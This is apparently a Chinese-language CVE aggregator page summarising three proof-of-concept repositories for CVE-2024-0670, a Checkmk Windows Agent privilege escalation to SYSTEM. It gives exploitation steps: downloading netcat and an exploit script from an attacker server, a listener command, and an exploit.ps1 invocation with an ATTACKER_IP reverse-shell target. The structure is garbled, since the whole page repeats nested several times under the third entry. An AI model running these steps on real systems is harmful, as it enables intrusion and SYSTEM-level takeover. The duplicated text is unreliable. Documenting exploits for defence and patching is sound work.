# CVE-2024-0670

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-0670-elsevar11_CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit.md](../2024/CVE-2024-0670-elsevar11_CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit.md)

## CVE-2024-0670 - Checkmk Agent 本地提权

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 本地权限提升

**影响应用:** Checkmk Agent

**危害等级:** 高危，本地用户可获取 SYSTEM 权限

**影响版本:** < 2.2.0p23, < 2.1.0p40, <= 2.0.0p39

**利用条件:** 低权限的Windows账户，允许执行 Powershell，能够从攻击者主机下载文件，已安装存在漏洞的 Checkmk Windows Agent

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-0670 是 Checkmk Agent Windows 版本中的一个本地权限提升漏洞。攻击者（本地低权限用户）可以利用该漏洞通过 MSI 修复机制执行任意代码，从而获得 SYSTEM 权限。

**漏洞利用方式：**

1.  **准备攻击环境：**
    *   攻击者需要准备一个 HTTP 服务器，用于托管攻击所需的工具（`RunasCs.exe`，`nc.exe`，`exploit.ps1`）。
    *   攻击者需要监听一个端口，用于接收反弹 shell（例如：`nc -lvnp 1111`）。

2.  **在目标机器上下载工具：**
    *   攻击者使用 PowerShell 从攻击者搭建的 HTTP 服务器下载 `RunasCs.exe`，`nc.exe`，`exploit.ps1` 到 `C:\Windows\Temp\` 目录。

3.  **执行漏洞利用脚本：**
    *   攻击者使用 PowerShell 执行 `exploit.ps1` 脚本（例如：`powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1 -MinPID 1000 -MaxPID 10000 -LHOST ATTACKER_IP -LPORT 1111`）。`exploit.ps1` 脚本会检测 Checkmk MSI 包，创建大量的批处理文件，并在批处理文件中写入反弹 shell 的 Payload，然后触发 MSI 修复，迫使以 SYSTEM 权限执行批处理文件，从而获得 SYSTEM 权限的反弹 shell。

**有效性：**

根据漏洞描述和提供的漏洞利用代码，该漏洞利用代码是有效的。它利用了 Checkmk Agent 在 Windows 上的一个权限提升漏洞，该漏洞允许低权限用户通过 MSI 修复机制获得 SYSTEM 权限。

**投毒风险：**

该仓库中存在一定投毒风险。虽然主要功能是权限提升，但是`RunasCs.cs`的功能是使用明文密码来运行程序，如果攻击者修改该代码，可能会导致密码泄露。此外，提供的`exploit.ps1`脚本内容复杂，可能存在未知的恶意行为。因此，投毒风险评估为10%。用户在使用前需要仔细审查代码，确保其安全性。

**项目地址:** [elsevar11/CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit](https://github.com/elsevar11/CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit)

**漏洞详情:** [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)

---

## POC #2

**来源**: [CVE-2024-0670-magicrc_CVE-2024-0670.md](../2024/CVE-2024-0670-magicrc_CVE-2024-0670.md)

## CVE-2024-0670-Checkmk-Windows Agent权限提升

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 权限提升

**影响应用:** Checkmk Windows Agent

**危害等级:** 高危，本地权限提升至SYSTEM

**影响版本:** < 2.2.0p23, < 2.1.0p40, <= 2.0.0p39

**利用条件:** 本地用户权限，可写入C:\Windows\Temp目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-0670 存在于Checkmk Windows Agent中，是由于 Agent 在 C:\Windows\Temp 目录下创建和执行临时文件的方式导致的。攻击者可以通过预先在 C:\Windows\Temp 目录中放置恶意文件并将其设置为只读，当 Agent 尝试创建同名临时文件时，会因无法覆盖而执行已存在的只读恶意文件，从而以 SYSTEM 权限执行任意命令，实现本地权限提升。

**漏洞利用方式：**

1.  **查找Check MK安装程序：** PoC脚本首先通过查询注册表定位Check MK的安装程序（MSI）。
2.  **创建恶意.cmd文件：**  脚本在 `C:\Windows\Temp` 目录下创建大量以 `cmk_all_$($i)_$($c).cmd` 命名的.cmd文件，并将指定的命令写入这些文件，然后将这些文件设置为只读属性。`$Cmd`变量控制执行的命令。
3.  **触发MSI重新安装：** PoC脚本通过`msiexec.exe /fa`重新安装Check MK的MSI包，这将触发Check MK尝试创建临时文件，由于已经存在同名只读文件，Check MK将会执行攻击者预先放置的恶意.cmd文件，从而实现权限提升。

**有效性：**

提供的PoC代码是有效的。从README.md文件内容、PowerShell脚本以及示例执行结果可以看出，该PoC已经成功地实现了权限提升，证明漏洞真实存在且PoC可用。

**投毒风险：**

经过分析，该PoC脚本本身不存在明显的投毒代码。该脚本的行为是明确的，即在 C:\Windows\Temp 目录下创建大量只读的 .cmd 文件，然后利用 msiexec 触发 Check MK 重新安装，从而执行预先放置的恶意 .cmd 文件。脚本的功能在于利用 Check MK 的漏洞来实现权限提升，而没有发现作者有意隐藏的恶意行为。因此，投毒风险评估为 0%。

**项目地址:** [magicrc/CVE-2024-0670](https://github.com/magicrc/CVE-2024-0670)

**漏洞详情:** [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)

---

## POC #3

**来源**: [CVE-2024-0670-zhulin837_checkmk_cve-2024-0670.md](../2024/CVE-2024-0670-zhulin837_checkmk_cve-2024-0670.md)

# CVE-2024-0670

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-0670-elsevar11_CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit.md](../2024/CVE-2024-0670-elsevar11_CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit.md)

## CVE-2024-0670 - Checkmk Agent 本地提权

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 本地权限提升

**影响应用:** Checkmk Agent

**危害等级:** 高危，本地用户可获取 SYSTEM 权限

**影响版本:** < 2.2.0p23, < 2.1.0p40, <= 2.0.0p39

**利用条件:** 低权限的Windows账户，允许执行 Powershell，能够从攻击者主机下载文件，已安装存在漏洞的 Checkmk Windows Agent

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-0670 是 Checkmk Agent Windows 版本中的一个本地权限提升漏洞。攻击者（本地低权限用户）可以利用该漏洞通过 MSI 修复机制执行任意代码，从而获得 SYSTEM 权限。

**漏洞利用方式：**

1.  **准备攻击环境：**
    *   攻击者需要准备一个 HTTP 服务器，用于托管攻击所需的工具（`RunasCs.exe`，`nc.exe`，`exploit.ps1`）。
    *   攻击者需要监听一个端口，用于接收反弹 shell（例如：`nc -lvnp 1111`）。

2.  **在目标机器上下载工具：**
    *   攻击者使用 PowerShell 从攻击者搭建的 HTTP 服务器下载 `RunasCs.exe`，`nc.exe`，`exploit.ps1` 到 `C:\Windows\Temp\` 目录。

3.  **执行漏洞利用脚本：**
    *   攻击者使用 PowerShell 执行 `exploit.ps1` 脚本（例如：`powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1 -MinPID 1000 -MaxPID 10000 -LHOST ATTACKER_IP -LPORT 1111`）。`exploit.ps1` 脚本会检测 Checkmk MSI 包，创建大量的批处理文件，并在批处理文件中写入反弹 shell 的 Payload，然后触发 MSI 修复，迫使以 SYSTEM 权限执行批处理文件，从而获得 SYSTEM 权限的反弹 shell。

**有效性：**

根据漏洞描述和提供的漏洞利用代码，该漏洞利用代码是有效的。它利用了 Checkmk Agent 在 Windows 上的一个权限提升漏洞，该漏洞允许低权限用户通过 MSI 修复机制获得 SYSTEM 权限。

**投毒风险：**

该仓库中存在一定投毒风险。虽然主要功能是权限提升，但是`RunasCs.cs`的功能是使用明文密码来运行程序，如果攻击者修改该代码，可能会导致密码泄露。此外，提供的`exploit.ps1`脚本内容复杂，可能存在未知的恶意行为。因此，投毒风险评估为10%。用户在使用前需要仔细审查代码，确保其安全性。

**项目地址:** [elsevar11/CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit](https://github.com/elsevar11/CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit)

**漏洞详情:** [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)

---

## POC #2

**来源**: [CVE-2024-0670-magicrc_CVE-2024-0670.md](../2024/CVE-2024-0670-magicrc_CVE-2024-0670.md)

## CVE-2024-0670-Checkmk-Windows Agent权限提升

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 权限提升

**影响应用:** Checkmk Windows Agent

**危害等级:** 高危，本地权限提升至SYSTEM

**影响版本:** < 2.2.0p23, < 2.1.0p40, <= 2.0.0p39

**利用条件:** 本地用户权限，可写入C:\Windows\Temp目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-0670 存在于Checkmk Windows Agent中，是由于 Agent 在 C:\Windows\Temp 目录下创建和执行临时文件的方式导致的。攻击者可以通过预先在 C:\Windows\Temp 目录中放置恶意文件并将其设置为只读，当 Agent 尝试创建同名临时文件时，会因无法覆盖而执行已存在的只读恶意文件，从而以 SYSTEM 权限执行任意命令，实现本地权限提升。

**漏洞利用方式：**

1.  **查找Check MK安装程序：** PoC脚本首先通过查询注册表定位Check MK的安装程序（MSI）。
2.  **创建恶意.cmd文件：**  脚本在 `C:\Windows\Temp` 目录下创建大量以 `cmk_all_$($i)_$($c).cmd` 命名的.cmd文件，并将指定的命令写入这些文件，然后将这些文件设置为只读属性。`$Cmd`变量控制执行的命令。
3.  **触发MSI重新安装：** PoC脚本通过`msiexec.exe /fa`重新安装Check MK的MSI包，这将触发Check MK尝试创建临时文件，由于已经存在同名只读文件，Check MK将会执行攻击者预先放置的恶意.cmd文件，从而实现权限提升。

**有效性：**

提供的PoC代码是有效的。从README.md文件内容、PowerShell脚本以及示例执行结果可以看出，该PoC已经成功地实现了权限提升，证明漏洞真实存在且PoC可用。

**投毒风险：**

经过分析，该PoC脚本本身不存在明显的投毒代码。该脚本的行为是明确的，即在 C:\Windows\Temp 目录下创建大量只读的 .cmd 文件，然后利用 msiexec 触发 Check MK 重新安装，从而执行预先放置的恶意 .cmd 文件。脚本的功能在于利用 Check MK 的漏洞来实现权限提升，而没有发现作者有意隐藏的恶意行为。因此，投毒风险评估为 0%。

**项目地址:** [magicrc/CVE-2024-0670](https://github.com/magicrc/CVE-2024-0670)

**漏洞详情:** [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)

---

## POC #3

**来源**: [CVE-2024-0670-zhulin837_checkmk_cve-2024-0670.md](../2024/CVE-2024-0670-zhulin837_checkmk_cve-2024-0670.md)

# CVE-2024-0670

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-0670-elsevar11_CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit.md](../2024/CVE-2024-0670-elsevar11_CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit.md)

## CVE-2024-0670 - Checkmk Agent 本地提权

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 本地权限提升

**影响应用:** Checkmk Agent

**危害等级:** 高危，本地用户可获取 SYSTEM 权限

**影响版本:** < 2.2.0p23, < 2.1.0p40, <= 2.0.0p39

**利用条件:** 低权限的Windows账户，允许执行 Powershell，能够从攻击者主机下载文件，已安装存在漏洞的 Checkmk Windows Agent

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-0670 是 Checkmk Agent Windows 版本中的一个本地权限提升漏洞。攻击者（本地低权限用户）可以利用该漏洞通过 MSI 修复机制执行任意代码，从而获得 SYSTEM 权限。

**漏洞利用方式：**

1.  **准备攻击环境：**
    *   攻击者需要准备一个 HTTP 服务器，用于托管攻击所需的工具（`RunasCs.exe`，`nc.exe`，`exploit.ps1`）。
    *   攻击者需要监听一个端口，用于接收反弹 shell（例如：`nc -lvnp 1111`）。

2.  **在目标机器上下载工具：**
    *   攻击者使用 PowerShell 从攻击者搭建的 HTTP 服务器下载 `RunasCs.exe`，`nc.exe`，`exploit.ps1` 到 `C:\Windows\Temp\` 目录。

3.  **执行漏洞利用脚本：**
    *   攻击者使用 PowerShell 执行 `exploit.ps1` 脚本（例如：`powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1 -MinPID 1000 -MaxPID 10000 -LHOST ATTACKER_IP -LPORT 1111`）。`exploit.ps1` 脚本会检测 Checkmk MSI 包，创建大量的批处理文件，并在批处理文件中写入反弹 shell 的 Payload，然后触发 MSI 修复，迫使以 SYSTEM 权限执行批处理文件，从而获得 SYSTEM 权限的反弹 shell。

**有效性：**

根据漏洞描述和提供的漏洞利用代码，该漏洞利用代码是有效的。它利用了 Checkmk Agent 在 Windows 上的一个权限提升漏洞，该漏洞允许低权限用户通过 MSI 修复机制获得 SYSTEM 权限。

**投毒风险：**

该仓库中存在一定投毒风险。虽然主要功能是权限提升，但是`RunasCs.cs`的功能是使用明文密码来运行程序，如果攻击者修改该代码，可能会导致密码泄露。此外，提供的`exploit.ps1`脚本内容复杂，可能存在未知的恶意行为。因此，投毒风险评估为10%。用户在使用前需要仔细审查代码，确保其安全性。

**项目地址:** [elsevar11/CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit](https://github.com/elsevar11/CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit)

**漏洞详情:** [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)

---

## POC #2

**来源**: [CVE-2024-0670-magicrc_CVE-2024-0670.md](../2024/CVE-2024-0670-magicrc_CVE-2024-0670.md)

## CVE-2024-0670-Checkmk-Windows Agent权限提升

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 权限提升

**影响应用:** Checkmk Windows Agent

**危害等级:** 高危，本地权限提升至SYSTEM

**影响版本:** < 2.2.0p23, < 2.1.0p40, <= 2.0.0p39

**利用条件:** 本地用户权限，可写入C:\Windows\Temp目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-0670 存在于Checkmk Windows Agent中，是由于 Agent 在 C:\Windows\Temp 目录下创建和执行临时文件的方式导致的。攻击者可以通过预先在 C:\Windows\Temp 目录中放置恶意文件并将其设置为只读，当 Agent 尝试创建同名临时文件时，会因无法覆盖而执行已存在的只读恶意文件，从而以 SYSTEM 权限执行任意命令，实现本地权限提升。

**漏洞利用方式：**

1.  **查找Check MK安装程序：** PoC脚本首先通过查询注册表定位Check MK的安装程序（MSI）。
2.  **创建恶意.cmd文件：**  脚本在 `C:\Windows\Temp` 目录下创建大量以 `cmk_all_$($i)_$($c).cmd` 命名的.cmd文件，并将指定的命令写入这些文件，然后将这些文件设置为只读属性。`$Cmd`变量控制执行的命令。
3.  **触发MSI重新安装：** PoC脚本通过`msiexec.exe /fa`重新安装Check MK的MSI包，这将触发Check MK尝试创建临时文件，由于已经存在同名只读文件，Check MK将会执行攻击者预先放置的恶意.cmd文件，从而实现权限提升。

**有效性：**

提供的PoC代码是有效的。从README.md文件内容、PowerShell脚本以及示例执行结果可以看出，该PoC已经成功地实现了权限提升，证明漏洞真实存在且PoC可用。

**投毒风险：**

经过分析，该PoC脚本本身不存在明显的投毒代码。该脚本的行为是明确的，即在 C:\Windows\Temp 目录下创建大量只读的 .cmd 文件，然后利用 msiexec 触发 Check MK 重新安装，从而执行预先放置的恶意 .cmd 文件。脚本的功能在于利用 Check MK 的漏洞来实现权限提升，而没有发现作者有意隐藏的恶意行为。因此，投毒风险评估为 0%。

**项目地址:** [magicrc/CVE-2024-0670](https://github.com/magicrc/CVE-2024-0670)

**漏洞详情:** [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)

---

## POC #3

**来源**: [CVE-2024-0670-zhulin837_checkmk_cve-2024-0670.md](../2024/CVE-2024-0670-zhulin837_checkmk_cve-2024-0670.md)

# CVE-2024-0670

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-0670-elsevar11_CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit.md](../2024/CVE-2024-0670-elsevar11_CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit.md)

## CVE-2024-0670 - Checkmk Agent 本地提权

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 本地权限提升

**影响应用:** Checkmk Agent

**危害等级:** 高危，本地用户可获取 SYSTEM 权限

**影响版本:** < 2.2.0p23, < 2.1.0p40, <= 2.0.0p39

**利用条件:** 低权限的Windows账户，允许执行 Powershell，能够从攻击者主机下载文件，已安装存在漏洞的 Checkmk Windows Agent

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-0670 是 Checkmk Agent Windows 版本中的一个本地权限提升漏洞。攻击者（本地低权限用户）可以利用该漏洞通过 MSI 修复机制执行任意代码，从而获得 SYSTEM 权限。

**漏洞利用方式：**

1.  **准备攻击环境：**
    *   攻击者需要准备一个 HTTP 服务器，用于托管攻击所需的工具（`RunasCs.exe`，`nc.exe`，`exploit.ps1`）。
    *   攻击者需要监听一个端口，用于接收反弹 shell（例如：`nc -lvnp 1111`）。

2.  **在目标机器上下载工具：**
    *   攻击者使用 PowerShell 从攻击者搭建的 HTTP 服务器下载 `RunasCs.exe`，`nc.exe`，`exploit.ps1` 到 `C:\Windows\Temp\` 目录。

3.  **执行漏洞利用脚本：**
    *   攻击者使用 PowerShell 执行 `exploit.ps1` 脚本（例如：`powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1 -MinPID 1000 -MaxPID 10000 -LHOST ATTACKER_IP -LPORT 1111`）。`exploit.ps1` 脚本会检测 Checkmk MSI 包，创建大量的批处理文件，并在批处理文件中写入反弹 shell 的 Payload，然后触发 MSI 修复，迫使以 SYSTEM 权限执行批处理文件，从而获得 SYSTEM 权限的反弹 shell。

**有效性：**

根据漏洞描述和提供的漏洞利用代码，该漏洞利用代码是有效的。它利用了 Checkmk Agent 在 Windows 上的一个权限提升漏洞，该漏洞允许低权限用户通过 MSI 修复机制获得 SYSTEM 权限。

**投毒风险：**

该仓库中存在一定投毒风险。虽然主要功能是权限提升，但是`RunasCs.cs`的功能是使用明文密码来运行程序，如果攻击者修改该代码，可能会导致密码泄露。此外，提供的`exploit.ps1`脚本内容复杂，可能存在未知的恶意行为。因此，投毒风险评估为10%。用户在使用前需要仔细审查代码，确保其安全性。

**项目地址:** [elsevar11/CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit](https://github.com/elsevar11/CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit)

**漏洞详情:** [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)

---

## POC #2

**来源**: [CVE-2024-0670-magicrc_CVE-2024-0670.md](../2024/CVE-2024-0670-magicrc_CVE-2024-0670.md)

## CVE-2024-0670-Checkmk-Windows Agent权限提升

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 权限提升

**影响应用:** Checkmk Windows Agent

**危害等级:** 高危，本地权限提升至SYSTEM

**影响版本:** < 2.2.0p23, < 2.1.0p40, <= 2.0.0p39

**利用条件:** 本地用户权限，可写入C:\Windows\Temp目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-0670 存在于Checkmk Windows Agent中，是由于 Agent 在 C:\Windows\Temp 目录下创建和执行临时文件的方式导致的。攻击者可以通过预先在 C:\Windows\Temp 目录中放置恶意文件并将其设置为只读，当 Agent 尝试创建同名临时文件时，会因无法覆盖而执行已存在的只读恶意文件，从而以 SYSTEM 权限执行任意命令，实现本地权限提升。

**漏洞利用方式：**

1.  **查找Check MK安装程序：** PoC脚本首先通过查询注册表定位Check MK的安装程序（MSI）。
2.  **创建恶意.cmd文件：**  脚本在 `C:\Windows\Temp` 目录下创建大量以 `cmk_all_$($i)_$($c).cmd` 命名的.cmd文件，并将指定的命令写入这些文件，然后将这些文件设置为只读属性。`$Cmd`变量控制执行的命令。
3.  **触发MSI重新安装：** PoC脚本通过`msiexec.exe /fa`重新安装Check MK的MSI包，这将触发Check MK尝试创建临时文件，由于已经存在同名只读文件，Check MK将会执行攻击者预先放置的恶意.cmd文件，从而实现权限提升。

**有效性：**

提供的PoC代码是有效的。从README.md文件内容、PowerShell脚本以及示例执行结果可以看出，该PoC已经成功地实现了权限提升，证明漏洞真实存在且PoC可用。

**投毒风险：**

经过分析，该PoC脚本本身不存在明显的投毒代码。该脚本的行为是明确的，即在 C:\Windows\Temp 目录下创建大量只读的 .cmd 文件，然后利用 msiexec 触发 Check MK 重新安装，从而执行预先放置的恶意 .cmd 文件。脚本的功能在于利用 Check MK 的漏洞来实现权限提升，而没有发现作者有意隐藏的恶意行为。因此，投毒风险评估为 0%。

**项目地址:** [magicrc/CVE-2024-0670](https://github.com/magicrc/CVE-2024-0670)

**漏洞详情:** [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)

---

## POC #3

**来源**: [CVE-2024-0670-zhulin837_checkmk_cve-2024-0670.md](../2024/CVE-2024-0670-zhulin837_checkmk_cve-2024-0670.md)

# CVE-2024-0670

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-0670-elsevar11_CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit.md](../2024/CVE-2024-0670-elsevar11_CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit.md)

## CVE-2024-0670 - Checkmk Agent 本地提权

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 本地权限提升

**影响应用:** Checkmk Agent

**危害等级:** 高危，本地用户可获取 SYSTEM 权限

**影响版本:** < 2.2.0p23, < 2.1.0p40, <= 2.0.0p39

**利用条件:** 低权限的Windows账户，允许执行 Powershell，能够从攻击者主机下载文件，已安装存在漏洞的 Checkmk Windows Agent

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-0670 是 Checkmk Agent Windows 版本中的一个本地权限提升漏洞。攻击者（本地低权限用户）可以利用该漏洞通过 MSI 修复机制执行任意代码，从而获得 SYSTEM 权限。

**漏洞利用方式：**

1.  **准备攻击环境：**
    *   攻击者需要准备一个 HTTP 服务器，用于托管攻击所需的工具（`RunasCs.exe`，`nc.exe`，`exploit.ps1`）。
    *   攻击者需要监听一个端口，用于接收反弹 shell（例如：`nc -lvnp 1111`）。

2.  **在目标机器上下载工具：**
    *   攻击者使用 PowerShell 从攻击者搭建的 HTTP 服务器下载 `RunasCs.exe`，`nc.exe`，`exploit.ps1` 到 `C:\Windows\Temp\` 目录。

3.  **执行漏洞利用脚本：**
    *   攻击者使用 PowerShell 执行 `exploit.ps1` 脚本（例如：`powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1 -MinPID 1000 -MaxPID 10000 -LHOST ATTACKER_IP -LPORT 1111`）。`exploit.ps1` 脚本会检测 Checkmk MSI 包，创建大量的批处理文件，并在批处理文件中写入反弹 shell 的 Payload，然后触发 MSI 修复，迫使以 SYSTEM 权限执行批处理文件，从而获得 SYSTEM 权限的反弹 shell。

**有效性：**

根据漏洞描述和提供的漏洞利用代码，该漏洞利用代码是有效的。它利用了 Checkmk Agent 在 Windows 上的一个权限提升漏洞，该漏洞允许低权限用户通过 MSI 修复机制获得 SYSTEM 权限。

**投毒风险：**

该仓库中存在一定投毒风险。虽然主要功能是权限提升，但是`RunasCs.cs`的功能是使用明文密码来运行程序，如果攻击者修改该代码，可能会导致密码泄露。此外，提供的`exploit.ps1`脚本内容复杂，可能存在未知的恶意行为。因此，投毒风险评估为10%。用户在使用前需要仔细审查代码，确保其安全性。

**项目地址:** [elsevar11/CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit](https://github.com/elsevar11/CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit)

**漏洞详情:** [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)

---

## POC #2

**来源**: [CVE-2024-0670-magicrc_CVE-2024-0670.md](../2024/CVE-2024-0670-magicrc_CVE-2024-0670.md)

## CVE-2024-0670-Checkmk-Windows Agent权限提升

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 权限提升

**影响应用:** Checkmk Windows Agent

**危害等级:** 高危，本地权限提升至SYSTEM

**影响版本:** < 2.2.0p23, < 2.1.0p40, <= 2.0.0p39

**利用条件:** 本地用户权限，可写入C:\Windows\Temp目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-0670 存在于Checkmk Windows Agent中，是由于 Agent 在 C:\Windows\Temp 目录下创建和执行临时文件的方式导致的。攻击者可以通过预先在 C:\Windows\Temp 目录中放置恶意文件并将其设置为只读，当 Agent 尝试创建同名临时文件时，会因无法覆盖而执行已存在的只读恶意文件，从而以 SYSTEM 权限执行任意命令，实现本地权限提升。

**漏洞利用方式：**

1.  **查找Check MK安装程序：** PoC脚本首先通过查询注册表定位Check MK的安装程序（MSI）。
2.  **创建恶意.cmd文件：**  脚本在 `C:\Windows\Temp` 目录下创建大量以 `cmk_all_$($i)_$($c).cmd` 命名的.cmd文件，并将指定的命令写入这些文件，然后将这些文件设置为只读属性。`$Cmd`变量控制执行的命令。
3.  **触发MSI重新安装：** PoC脚本通过`msiexec.exe /fa`重新安装Check MK的MSI包，这将触发Check MK尝试创建临时文件，由于已经存在同名只读文件，Check MK将会执行攻击者预先放置的恶意.cmd文件，从而实现权限提升。

**有效性：**

提供的PoC代码是有效的。从README.md文件内容、PowerShell脚本以及示例执行结果可以看出，该PoC已经成功地实现了权限提升，证明漏洞真实存在且PoC可用。

**投毒风险：**

经过分析，该PoC脚本本身不存在明显的投毒代码。该脚本的行为是明确的，即在 C:\Windows\Temp 目录下创建大量只读的 .cmd 文件，然后利用 msiexec 触发 Check MK 重新安装，从而执行预先放置的恶意 .cmd 文件。脚本的功能在于利用 Check MK 的漏洞来实现权限提升，而没有发现作者有意隐藏的恶意行为。因此，投毒风险评估为 0%。

**项目地址:** [magicrc/CVE-2024-0670](https://github.com/magicrc/CVE-2024-0670)

**漏洞详情:** [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)

---

## POC #3

**来源**: [CVE-2024-0670-zhulin837_checkmk_cve-2024-0670.md](../2024/CVE-2024-0670-zhulin837_checkmk_cve-2024-0670.md)

## CVE-2024-0670-Checkmk-权限提升

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 权限提升

**影响应用:** Checkmk

**危害等级:** 高危，本地用户可提升权限

**影响版本:** < 2.2.0p23, < 2.1.0p40, <= 2.0.0p39

**利用条件:** 需要本地用户权限

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-0670 是 Checkmk Windows Agent 插件中的一个权限提升漏洞。漏洞原因是由于对搜索路径的控制不当（CWE-427），允许本地用户提升权限。

**有效性：**

提供的 POC 代码看起来是有效的。它利用 msiexec 修复功能，通过将包含反向 shell 的批处理文件写入到 SYSTEM 权限可以访问的临时目录，并将其标记为只读，从而触发权限提升。`RunasCs.exe` 用于以指定用户身份执行命令。脚本的主要步骤如下：

1.  在注册表中查找 Check MK 相关的 MSI 文件。
2.  在 `C:\Windows\Temp` 目录下生成大量以 `cmk_all_<PID>_<counter>.cmd` 命名的批处理文件，批处理文件的内容为启动 nc.exe 建立反向shell。 这些批处理文件会被设置为只读。
3.  使用 `msiexec.exe` 触发 MSI 修复操作，使用日志文件记录修复过程。
4. `zh.ps1` 脚本使用 `nc64.exe` 作为反向 shell 工具，这表明目标系统是 64 位的 Windows 系统。

**投毒风险：**

存在一定的投毒风险，虽然主要功能是利用漏洞，但需要注意以下几点：

*   **下载可执行文件：** 脚本从远程服务器下载 `nc64.exe` 和 `RunasCs.exe`。这引入了潜在的投毒风险，因为攻击者可以替换这些文件为恶意文件。尽管 `nc64.exe` 常用于网络连接，但下载和执行未经信任的二进制文件始终存在风险。
*   **批处理文件：** 脚本创建大量批处理文件，虽然主要目的是为了利用漏洞，但也增加了文件系统中残留恶意代码的可能性。
*   **参数传递：** `RunasCs.exe` 接收用户名和密码作为参数，虽然示例中是测试凭据，但实际攻击中可能会尝试其他凭据，或者在一定条件下泄露。代码中硬编码密码有安全风险。
*  **风险评估：** 综合考虑，该漏洞利用代码的投毒风险在10%左右。主要风险在于下载的可执行文件可能被替换为恶意文件。

**利用方式：**

1.  **环境准备：** 在攻击者控制的服务器上托管 `zh.ps1`、`nc64.exe` 和 `RunasCs.exe` 文件。
2.  **执行 RunasCs.exe：** 在受害者机器上，使用 `RunasCs.exe` 以某个用户身份执行 PowerShell 脚本 `zh.ps1`。
3.  **查找 MSI 文件：** `zh.ps1` 脚本会查找 Check MK 相关的 MSI 安装文件。
4.  **生成批处理文件：** 脚本生成大量的批处理文件到 `C:\Windows\Temp` 目录，这些文件包含启动 `nc64.exe` 反向 shell 的命令。
5.  **触发 MSI 修复：** 脚本使用 `msiexec.exe` 触发 MSI 修复，这会执行之前生成的批处理文件，从而以 SYSTEM 权限运行反向 shell。
6.  **获得 Shell：** 攻击者在其监听端口上接收反向 shell，从而获得 SYSTEM 权限。

**项目地址:** [zhulin837/checkmk_cve-2024-0670](https://github.com/zhulin837/checkmk_cve-2024-0670)

**漏洞详情:** [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)

---



---



---



---



---

